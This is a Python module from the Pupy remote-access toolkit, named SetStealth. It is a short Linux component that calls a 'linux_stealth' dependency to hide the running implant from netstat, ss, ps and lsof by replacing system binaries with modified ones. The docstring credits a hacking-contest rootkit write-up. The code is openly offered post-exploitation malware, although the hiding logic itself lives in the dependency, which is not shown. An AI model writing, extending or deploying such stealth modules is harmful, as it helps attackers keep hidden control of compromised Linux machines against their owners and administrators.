#!/usr/bin/env python

from pupylib.PupyModule import (
    config, PupyModule, PupyArgumentParser,
    QA_UNSTABLE
)
from pupylib.utils.rpyc_utils import redirected_stdio

__class_name__="SetStealth"

@config(compat="linux", cat="manage")
class SetStealth(PupyModule):
    """Hides the running process from netstat, ss, ps, lsof by using modified binaries.
Credits to: http://www.jakoblell.com/blog/2014/05/07/hacking-contest-rootkit/
Demo: https://vimeo.com/157356150"""

    dependencies=["linux_stealth"]
    qa = QA_UNSTABLE

    @classmethod
    def init_argparse(cls):
        cls.arg_parser = PupyArgumentParser(prog="Linux Stealth Module", description=cls.__doc__)
        cls.arg_parser.add_argument('--port', default=None, help='The port number to which Pupy is connecting to.')

    def run(self, args):
        with redirected_stdio(self):
            self.client.conn.modules['linux_stealth'].run(args.port)
        self.success("Module executed successfully.")
